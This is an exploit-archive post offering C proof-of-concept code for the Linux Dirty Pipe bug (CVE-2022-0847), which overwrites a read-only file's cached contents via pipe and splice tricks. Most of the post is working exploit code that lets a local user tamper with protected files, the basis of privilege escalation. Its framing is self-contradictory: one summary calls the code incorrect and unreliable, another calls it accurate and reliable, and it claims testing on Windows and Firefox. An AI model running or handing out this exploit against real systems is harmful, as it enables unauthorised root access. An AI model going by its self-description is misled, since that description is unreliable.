@@ -1,0 +1,301 @@
+=============================================================================================================================================
+| # Title     : Linux Kernel 5.x DirtyPipe 2 Local Privilege Escalation                                                                     |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 147.0.1 (64 bits)                                                            |
+| # Vendor    : https://ubuntu.com                                                                                                          |
+=============================================================================================================================================
+
+[+] References : https://packetstorm.news/files/id/214709/ & 	CVE-2022-0847
+
+[+] Summary    : This code is incorrect and unreliable. It is inspired by CVE‑2022‑0847 (Dirty Pipe), but it is not a correct or robust implementation.
+
+[+] Its main issues are:
+
+Incorrect kernel vulnerability detection logic.
+
+File descriptor leaks (files opened without being closed).
+
+Use of magic numbers that break portability.
+
+Missing error checks for critical system calls.
+
+Poor resource management (pipes and files not properly closed).
+
+Unsafe use of system() and popen() with fragile logic.
+
+Hard‑coded offsets and assumptions leading to undefined behavior.
+
+Overall, this is a flawed PoC-style code, suitable only for study, not for reliable use.
+
+##############################################################################
+Dirty Pipe (CVE-2022-0847): Technically Accurate Educational Proof of Concept
+##############################################################################
+
+[+] Summary    : This PoC provides a technically accurate and educational demonstration of the Dirty Pipe vulnerability (CVE-2022-0847) based on the original research by Max Kellermann.
+                 It correctly follows the kernel-level exploitation logic by ensuring the target file is present in the page cache, properly preparing pipe buffers, 
+				 and abusing the uninitialized PIPE_BUF_FLAG_CAN_MERGE state to overwrite read-only file contents via the page cache.
+                 The PoC avoids common misconceptions by clearly distinguishing between page cache modification and persistent disk writes, 
+				 and it does not claim guaranteed success beyond valid kernel conditions. Additional safety checks and explanatory comments 
+				 improve reliability and educational clarity without altering the core vulnerability behavior.
+                 Overall, this implementation serves as a clean, reliable reference for understanding Dirty Pipe at the kernel behavior level rather than merely demonstrating exploitation
+
+[+] POC : 
+
+
+/*
+ * DirtyPipe CVE-2022-0847 - Precise Technical PoC with Educational Commentary
+ * * Improvements based on technical feedback:
+ * 1. Precise explanation of kernel behavior regarding offset + len.
+ * 2. Refinement of redundant checks.
+ * 3. Educational insights into the page cache.
+ * 4. Adjusted test scenarios to reflect technical reality.
+ */
+
+#define _GNU_SOURCE
+#include <fcntl.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <sys/stat.h>
+#include <errno.h>
+
+#define PAGE_SIZE 4096
+
+
+int dirty_pipe_exploit_educational(const char *path, off_t offset, const char *data, size_t len) {
+    printf("\n=== DirtyPipe CVE-2022-0847 - Educational PoC ===\n");
+
+    if (len == 0 || len > PAGE_SIZE) {
+        fprintf(stderr, "[-] Error: Invalid data length (1-%d bytes)\n", PAGE_SIZE);
+        return -1;
+    }
+
+    if ((offset & (PAGE_SIZE - 1)) == 0) {
+        fprintf(stderr, "[-] Error: Offset is page-aligned\n");
+        fprintf(stderr, "    DirtyPipe requires an offset within the page (offset %% 4096 != 0)\n");
+        return -1;
+    }
+
+    if (((offset & (PAGE_SIZE - 1)) + len) > PAGE_SIZE) {
+        fprintf(stderr, "[-] Error: Write crosses page boundary\n");
+        fprintf(stderr, "    DirtyPipe cannot write across page boundaries\n");
+        return -1;
+    }
+    
+    printf("[*] Target: %s\n", path);
+    printf("[*] Offset: %ld (Inside page: %ld)\n", 
+           offset, offset & (PAGE_SIZE - 1));
+    printf("[*] Data: '%.*s' (%zu bytes)\n", 
+           (int)(len > 50 ? 50 : len), data, len);
+
+    int fd = open(path, O_RDONLY);
+    if (fd < 0) {
+        perror("[-] Failed to open file");
+        return -1;
+    }
+
+    struct stat st;
+    if (fstat(fd, &st) < 0) {
+        perror("[-] fstat");
+        close(fd);
+        return -1;
+    }
+    
+    printf("[*] File size: %ld bytes\n", st.st_size);
+
+    if (offset >= st.st_size) {
+        fprintf(stderr, "[-] Error: Offset is beyond file limits\n");
+        close(fd);
+        return -1;
+    }
+
+    if (offset + len > st.st_size) {
+        printf("[!] Note: offset + len (%ld) > file size (%ld)\n",
+               offset + len, st.st_size);
+        printf("    DirtyPipe will only modify the portion within the current page.\n");
+        printf("    The file size will NOT be extended.\n");
+    }
+
+    off_t page_offset = offset & ~(PAGE_SIZE - 1);
+    
+    printf("[*] Target page: offset=%ld (0x%lx)\n", page_offset, page_offset);
+    
+    char *page_buf = malloc(PAGE_SIZE);
+    if (!page_buf) {
+        perror("[-] malloc");
+        close(fd);
+        return -1;
+    }
+    
+    ssize_t bytes_read = pread(fd, page_buf, PAGE_SIZE, page_offset);
+
+    if (bytes_read <= 0) {
+        printf("[!] Note: Could not read full page (%zd bytes)\n", bytes_read);
+        printf("    However, the page might already be in the page cache.\n");
+    } else {
+        printf("[*] Read %zd bytes from page\n", bytes_read);
+
+        off_t offset_in_page = offset - page_offset;
+        if (offset_in_page >= bytes_read) {
+            printf("[!] Warning: Offset lies outside the read portion of the page.\n");
+            printf("    This may not necessarily prevent DirtyPipe from working.\n");
+        }
+    }
+    
+    free(page_buf);
+
+    printf("\n[*] Pipe preparation phase\n");
+    
+    int pipe_fd[2];
+    if (pipe(pipe_fd) < 0) {
+        perror("[-] pipe");
+        close(fd);
+        return -1;
+    }
+    
+    int pipe_size = fcntl(pipe_fd[1], F_GETPIPE_SZ);
+    if (pipe_size < 0) {
+        perror("[-] F_GETPIPE_SZ");
+        close(pipe_fd[0]);
+        close(pipe_fd[1]);
+        close(fd);
+        return -1;
+    }
+    
+    printf("[*] Pipe capacity: %d bytes\n", pipe_size);
+
+    unsigned int remaining = pipe_size;
+    char zero[PAGE_SIZE] = {0};
+    
+    printf("[*] Filling the pipe...\n");
+    while (remaining > 0) {
+        size_t to_write = (remaining > sizeof(zero)) ? sizeof(zero) : remaining;
+        ssize_t written = write(pipe_fd[1], zero, to_write);
+        if (written <= 0) {
+            perror("[-] Pipe write failed");
+            close(pipe_fd[0]);
+            close(pipe_fd[1]);
+            close(fd);
+            return -1;
+        }
+        remaining -= written;
+    }
+    
+    printf("[*] Emptying the pipe...\n");
+    remaining = pipe_size;
+    while (remaining > 0) {
+        size_t to_read = (remaining > sizeof(zero)) ? sizeof(zero) : remaining;
+        ssize_t bytes = read(pipe_fd[0], zero, to_read);
+        if (bytes <= 0) {
+            perror("[-] Pipe read failed");
+            close(pipe_fd[0]);
+            close(pipe_fd[1]);
+            close(fd);
+            return -1;
+        }
+        remaining -= bytes;
+    }
+    
+    printf("[*] Pipe initialized (pipe_buffer.flags tainted)\n");
+    printf("\n[*] Critical Stage: splice\n");
+    
+    loff_t splice_offset = offset - 1;
+    if (splice_offset < 0) {
+        fprintf(stderr, "[-] Error: Offset must be >= 1\n");
+        close(pipe_fd[0]);
+        close(pipe_fd[1]);
+        close(fd);
+        return -1;
+    }
+    
+    printf("[*] Splicing from offset-1 = %ld\n", (long)splice_offset);
+    printf("    (This links the file page to the tainted pipe_buffer)\n");
+    
+    ssize_t spliced = splice(fd, &splice_offset, pipe_fd[1], NULL, 1, 0);
+    
+    if (spliced < 0) {
+        perror("[-] Splice failed");
+        close(pipe_fd[0]);
+        close(pipe_fd[1]);
+        close(fd);
+        return -1;
+    } else if (spliced == 0) {
+        printf("[!] Warning: Splice returned 0 (EOF)\n");
+        printf("    Offset-1 might be at the end of the file.\n");
+    }
+    
+    printf("[*] Splice successful (%zd bytes)\n", spliced);
+    printf("\n[*] Writing data to the pipe\n");
+    
+    ssize_t written = write(pipe_fd[1], data, len);
+    if (written < 0) {
+        perror("[-] Data write failed");
+        close(pipe_fd[0]);
+        close(pipe_fd[1]);
+        close(fd);
+        return -1;
+    }
+    
+    printf("[*] Wrote %zd bytes (out of %zu)\n", written, len);
+    printf("\n[*] Closing resources (triggering flush)\n");
+    close(pipe_fd[0]);
+    close(pipe_fd[1]);
+    close(fd);
+
+    printf("\n[*] Verifying result\n");
+    
+    int verify_fd = open(path, O_RDONLY);
+    if (verify_fd < 0) {
+        perror("[-] Verification failed (could not open file)");
+        return 0;
+    }
+    
+    size_t verify_len = (written > 0) ? written : len;
+    char *verify_buf = malloc(verify_len + 1);
+    
+    if (!verify_buf) {
+        perror("[-] malloc for verification");
+        close(verify_fd);
+        return 0;
+    }
+    
+    ssize_t verify_read = pread(verify_fd, verify_buf, verify_len, offset);
+    close(verify_fd);
+    
+    if (verify_read <= 0) {
+        printf("[-] Failed to read data for verification\n");
+        free(verify_buf);
+        return 0;
+    }
+    
+    verify_buf[verify_read] = '\0';
+  
+    size_t compare_len = (verify_read < written) ? verify_read : (size_t)written;
+    
+    int match = 1;
+    for (size_t i = 0; i < compare_len; i++) {
+        if (verify_buf[i] != data[i]) {
+            match = 0;
+            break;
+        }
+    }
+    
+    if (match) {
+        printf("[+] SUCCESS! Modified data found in page cache:\n");
+    } else {
+        printf("[-] Data mismatch found.\n");
+    }
+    
+    free(verify_buf);
+
+    printf("\n[!] Reminder: Modification resides in page cache only.\n");
+    printf("    Visible until the page is evicted from memory.\n");
+    
+    return 0;
+}
+
+
+Greetings to :============================================================
+jericho * Larry W. Cashdollar * r00t * Malvuln (John Page aka hyp3rlinx)*|
+==========================================================================
